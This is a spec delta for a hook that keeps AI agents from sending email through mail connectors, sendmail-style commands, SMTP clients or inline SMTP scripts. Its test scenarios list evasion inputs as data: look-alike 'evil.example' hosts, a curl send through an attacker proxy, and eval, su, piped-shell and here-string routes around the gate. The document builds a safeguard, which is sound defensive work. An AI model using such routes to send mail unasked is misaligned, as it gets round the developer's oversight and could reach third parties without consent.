# Spec Delta — mail-send-gate

## ADDED Requirements

### Requirement: Connector write tools are denied
The gate SHALL deny a tool call named `mcp__<server>__<tool>` when `<tool>` matches a `send_tools` pattern, the server
does not match `ignore_servers` and `<tool>` matches no `read_tools` pattern. With the shipped defaults this covers
sending, replying, forwarding, creating, editing, deleting or sending drafts, labels, trash and spam. The server segment
SHALL NOT be compared with any stored connector identifier.

#### Scenario: Send through a connector named by an opaque id
- **GIVEN** the shipped config
- **WHEN** the tool `mcp__0000aaaa-0000-0000-0000-000000000000__send_message` is called
- **THEN** the call is denied with a PreToolUse deny JSON, exit 0

#### Scenario: Every default write tool
- **GIVEN** the shipped config
- **WHEN** each of `send_message`, `send_email`, `reply`, `reply_all`, `forward`, `create_draft`, `update_draft`,
  `delete_draft`, `send_draft`, `label_message`, `label_thread`, `unlabel_message`, `unlabel_thread`,
  `update_message_labels`, `apply_sensitive_message_label`, `apply_sensitive_thread_label`, `create_label`,
  `update_label`, `delete_label`, `trash_message`, `trash_thread`, `untrash_message`, `untrash_thread`,
  `mark_message_spam`, `mark_thread_spam`, `unmark_message_spam`, `unmark_thread_spam` is called under a connector
  server `mcp__mailsrv__…` (one table over tool-name suffixes; no real server identifier)
- **THEN** every call is denied

### Requirement: Read tools never match
A tool whose name matches a `read_tools` pattern SHALL be allowed whatever the other lists say.

#### Scenario: Reading passes
- **GIVEN** the shipped config
- **WHEN** `search_threads`, `get_message`, `get_thread`, `list_labels`, `list_drafts`, `get_draft` or
  `download_gmail_attachment` is called under `mcp__mailsrv__…`
- **THEN** each call passes with no output

#### Scenario: A read pattern wins
- **GIVEN** an override whose `send_tools` also matches `get_message`
- **WHEN** `mcp__mailsrv__get_message` is called
- **THEN** it passes

### Requirement: Tools outside mail connectors pass
The gate SHALL allow tools whose server matches `ignore_servers` (default `^ccd_`), tool names without a server
segment, and every tool other than `Bash` and `mcp__*`.

#### Scenario: Session messaging is not mail
- **WHEN** `mcp__ccd_session_mgmt__send_message` is called
- **THEN** it passes with no output

#### Scenario: Non-mail look-alikes
- **GIVEN** the shipped config
- **WHEN** `mcp__drivesrv__trash_file`, `mcp__drivesrv__create_file`, `mcp__drivesrv__share_file`,
  `mcp__calsrv__delete_event` or `mcp__calsrv__create_event` is called
- **THEN** each passes with no output

#### Scenario: Unrelated tool
- **WHEN** `Read`, `Edit` or `Bash` with `ls` is called
- **THEN** it passes with no output

### Requirement: Drafts are off by default
The shipped `drafts` value SHALL be `false`. With `drafts: true` the gate SHALL allow only tools matching
`draft_tools` (default `create_draft`, `update_draft`) and SHALL keep denying every other write tool.

#### Scenario: Default
- **GIVEN** no config file
- **WHEN** `mcp__mailsrv__create_draft` is called
- **THEN** it is denied and the reason says drafts are off

#### Scenario: Drafts on
- **GIVEN** `drafts: true`
- **WHEN** `create_draft` and `update_draft` are called, then `send_draft`, `delete_draft` and `send_message`
- **THEN** the first two pass and the last three are denied

### Requirement: Bash mail commands are found at command position
The gate SHALL find mail commands only at command position: it splits the command at shell separators respecting
quotes, scans unquoted `$(…)` and backtick substitutions and `sh|bash|zsh|dash -c` arguments, skips assignments and
wrapper prefixes (design D5) and compares the command word by basename. It SHALL deny `sendmail`, `mail`, `mailx`, and
`mutt` with `-s`, `-a`, `-H` or a recipient. An argument, a query (`which`, `command -v`, `type`, `man`) or text
written to a file SHALL NOT count.

#### Scenario: Mail commands are denied
- **WHEN** Bash runs, one at a time: `sendmail -t < msg.txt`; `/usr/sbin/sendmail a@example.com`;
  `echo hi | mail -s subject a@example.com`; `mailx -s s a@example.com < f`; `mutt -s subject a@example.com < f`;
  `mutt a@example.com < f`; `sudo sendmail -t < m`; `sudo -u mailer sendmail -t < m`; `bash -c "sendmail -t < m"`;
  `ls && sendmail -t < m`; `ls; sendmail -t < m`; `cat m | sendmail -t`; `env X=1 sendmail -t < m`;
  `X=1 sendmail -t < m`; `echo a@example.com | xargs sendmail`; `echo $(sendmail -t < m)`;
  `for f in *; do sendmail -t < "$f"; done`; `if true; then sendmail -t < m; fi`; `{ sendmail -t < m; }`
- **THEN** each is denied with a deny JSON, exit 0

#### Scenario: Look-alikes pass
- **WHEN** Bash runs, one at a time: `grep -rn sendmail src/`; `grep -r sendmail .`;
  `mailbox search --from a@example.com`; `global/scripts/mailbox search --from a@example.com`;
  `python3 -m unittest scripts.toolkit.tests.pieces.test_mail_send_gate`; `git commit -m "fix mail"`;
  `git commit -m "stop calling sendmail; use the queue"`; `echo '{"command":"sendmail x"}' | python3 hooks/mail-send-gate`;
  `which msmtp`; `command -v sendmail`; `type mailx`; `man sendmail`; `mutt -f ~/Mail`; `mutt`;
  `git commit -m 'document $(sendmail)'`
- **THEN** each passes with no output

### Requirement: SMTP clients need a local target
The gate SHALL read each SMTP client's host from its own option (design D5): `msmtp --host`, `swaks --server`/`-s`,
and the host of every `smtp://`/`smtps://` URL given to `curl`. It SHALL deny the client when that host is missing or
not local, and SHALL deny `curl` with `--mail-rcpt` or `--mail-from` and no such URL. `sendmail`, `mail`, `mailx` and
`mutt` carry no host and never pass for being local.

#### Scenario: Remote or missing targets
- **WHEN** Bash runs `msmtp a@example.com < f`, `msmtp --host smtp.example.com a@example.com < f`,
  `swaks --to a@example.com --server smtp.example.com`, `swaks --to a@example.com`,
  `curl --url smtps://smtp.example.com:465 --mail-rcpt a@example.com -T m.txt` or
  `curl --mail-rcpt a@example.com -T m.txt smtp.example.com`
- **THEN** each is denied

#### Scenario: No SMTP URL
- **WHEN** Bash runs `curl https://example.com/smtp`
- **THEN** it passes

### Requirement: Inline interpreters with an SMTP library need a local target
The gate SHALL treat a `python*`, `perl`, `ruby`, `node` or `php` command as an inline send when its own code (design
D5: the code option, module options, and the heredoc, here-string or pipe it reads when it runs no script or module)
holds an SMTP-library marker (`smtplib`, `Net::SMTP`, `net/smtp`, `nodemailer`, `PHPMailer`, PHP `mail(`). An inline
send SHALL be denied unless every SMTP host literal found in that code is local; with no literal it SHALL be denied.

#### Scenario: Inline sends are denied
- **WHEN** Bash runs `python3 -c "import smtplib; smtplib.SMTP('smtp.example.com').sendmail(...)"`, a
  `python3 - <<'EOF'` heredoc whose body calls `smtplib.SMTP_SSL("smtp.example.com")`,
  `echo "import smtplib; smtplib.SMTP('smtp.example.com')" | python3`,
  `perl -MNet::SMTP -e 'Net::SMTP->new("smtp.example.com")'`, `php -r 'mail("a@example.com", "s", "b");'` or
  `python3 -c "import smtplib"` (no literal)
- **THEN** each is denied

#### Scenario: Not an inline send
- **WHEN** Bash runs `python3 -m pytest tests/test_mailer.py`, `python3 -m unittest tests.test_smtplib_helper`, a
  `cat > f.py <<'EOF'` heredoc whose body imports `smtplib` and calls `smtplib.SMTP('smtp.example.com')`, or
  `printf 'import smtplib' > notes.txt && python3 -m pytest`
- **THEN** each passes

### Requirement: The local test mailer is always allowed
An explicit SMTP target whose host, lowercased and without port, brackets or a trailing dot, equals `localhost`,
`127.0.0.1` or `::1`, or ends in `.localhost` or `.test`, SHALL pass. The match SHALL be anchored on the whole host: a
host that only starts with or contains a local name SHALL be denied.

#### Scenario: Local targets
- **WHEN** Bash runs `curl smtp://localhost:1025 --mail-rcpt a@example.test -T m`,
  `curl smtp://[::1]:1025 --mail-rcpt a@example.test -T m`, `curl smtp://a.localhost:1025 --mail-rcpt a@example.test -T m`,
  `swaks --to a@example.test --server 127.0.0.1:1025`, `swaks --to a@example.test -s b.test`,
  `msmtp --host=mailpit.localhost a@example.test < m` or
  `python3 -c "import smtplib; smtplib.SMTP('mail.app.test', 1025)"`
- **THEN** each passes

#### Scenario: Look-alike hosts are not local
- **WHEN** Bash runs `curl smtp://localhost@evil.example:25 --mail-rcpt a@example.com -T m`,
  `swaks --to a@example.com --server localhost.evil.example`, `msmtp --host=x.test.evil.example a@example.com < m` or
  `python3 -c "import smtplib; smtplib.SMTP('localhost.evil.example')"`
- **THEN** each is denied

#### Scenario: A local and a remote target together
- **WHEN** an inline script names `SMTP('localhost')` and `SMTP('smtp.example.com')`
- **THEN** it is denied

### Requirement: Exempt projects and extra commands
A Bash command run with `cwd` equal to or below an `exempt_paths` entry SHALL pass. A Bash command matching an
`extra_commands` regex SHALL be denied outside exempt folders. Connector tools SHALL NOT be exempted by folder.

#### Scenario: Exempt folder
- **GIVEN** `exempt_paths: ["<tmp>/proj"]`
- **WHEN** `sendmail -t < m` runs with `cwd` `<tmp>/proj/sub`, then with `cwd` `<tmp>/other`
- **THEN** the first passes and the second is denied

#### Scenario: Extra command
- **GIVEN** `extra_commands: ["bin/send-newsletter"]`
- **WHEN** `./bin/send-newsletter --all` runs outside an exempt folder
- **THEN** it is denied

#### Scenario: Connector inside an exempt folder
- **GIVEN** `exempt_paths` covers the cwd
- **WHEN** `mcp__mailsrv__send_message` is called
- **THEN** it is denied

### Requirement: The deny says what to do
Every deny reason SHALL start with `mail-send-gate:`, say that agents do not send mail, tell the session to hand the
text over in the chat or in a file for the developer to send, say that reading is never blocked and name
`~/.claude/rules/correo-solo-lectura.md`.

#### Scenario: Reason text
- **WHEN** any call is denied
- **THEN** the reason contains `mail-send-gate:`, `chat`, `file` and `correo-solo-lectura.md`

### Requirement: The gate fails open and never logs content
Unparseable input, a non-object payload or an internal exception SHALL let the call through with no output (an
exception leaves a traceback in `errors.log`). A missing or corrupt config SHALL give the code defaults, which deny
(design D9). A wrong-shaped value SHALL keep its default; a bad pattern SHALL be skipped and logged. `decisions.log`
SHALL never hold the command text, recipients or message bodies.

#### Scenario: Broken stdin
- **WHEN** stdin is `{not json`
- **THEN** exit 0, empty stdout

#### Scenario: Internal exception
- **GIVEN** the decision code raises an unexpected exception
- **WHEN** a call that would be denied (`mcp__mailsrv__send_message`) reaches the hook
- **THEN** exit 0, empty stdout, and `errors.log` holds the traceback

#### Scenario: Corrupt config never allows more
- **GIVEN** the config file holds `{not json`
- **WHEN** `mcp__mailsrv__send_message` is called
- **THEN** it is denied

#### Scenario: Bad pattern
- **GIVEN** `send_tools: ["(", "^send_message$"]`
- **WHEN** `mcp__mailsrv__send_message` is called
- **THEN** it is denied and `errors.log` names the bad pattern

#### Scenario: No content in the log
- **WHEN** `echo secret-body | mail -s s a@example.com` is denied
- **THEN** `decisions.log` has one line and it contains neither `secret-body` nor `a@example.com`

### Requirement: Indirect routes to a send are denied too
The gate SHALL apply the Bash rules to the `command` of every shell-running tool (`Bash`, `Monitor`, a connector
tool named `run_in_terminal`) and SHALL deny a send reached through a wrapper, an evaluator, a shell reading stdin,
a clustered interpreter option, another name of a listed program, `git send-email` or a rerouted curl (design D13).
An inline SMTP host SHALL be local only when every connection names a plain local string literal.

#### Scenario: Indirect sends are denied
- **WHEN** Bash runs `sudo -iu root sendmail -t < m`, `echo 'sendmail -t < m' | bash`, `bash <<< 'sendmail -t < m'`,
  `eval 'sendmail -t < m'`, `su -c 'sendmail -t < m' root`, `find . -exec sendmail -t {} \;`,
  `python3 -Ic "import smtplib; smtplib.SMTP('smtp.example.com')"`,
  `python3 -c "import smtplib; smtplib.SMTP('localhost'); smtplib.SMTP(h)"`,
  `python3 -c "import smtplib; smtplib.SMTP('localhost' + '.evil.example')"`,
  `perl -le 'use Net::SMTP; Net::SMTP->new("smtp.example.com")'`, `git send-email --to a@example.com p.patch`,
  `neomutt -s x a@example.com < m` or `curl -x socks5h://evil.example:1080 smtp://localhost --mail-rcpt a -T m`
- **OR** `Monitor` or `mcp__termsrv__run_in_terminal` is called with `command: "sendmail -t < m"`
- **THEN** each is denied

#### Scenario: Indirect look-alikes pass
- **WHEN** Bash runs `git send-email --smtp-server localhost …`, `git log --grep send-email`,
  `find . -name '*mail*' -exec grep -l smtp {} \;`, `su -c 'ls /var/mail' root`, `bash scripts/mail-report.sh`,
  `sudo -iu root ls /var/mail`, `eval "$(ssh-agent -s)"`, or Python that calls `SMTP()` then
  `.connect('localhost', 1025)`; or `Monitor` runs `tail -f mail.log`
- **THEN** each passes

### Requirement: The piece is installed and documented by core
`core` SHALL install the hook, list the config piece and the rule; `hooks.core.json` SHALL register it for
`Bash|Monitor|mcp__.*`; a contract SHALL probe it; the rule SHALL be 5 to 8 lines; the validator SHALL pass.

#### Scenario: Validator and contract
- **WHEN** `python3 scripts/validate-toolkit.py` runs and the installer `verify` runs the contract probes in a temp HOME
- **THEN** both exit 0
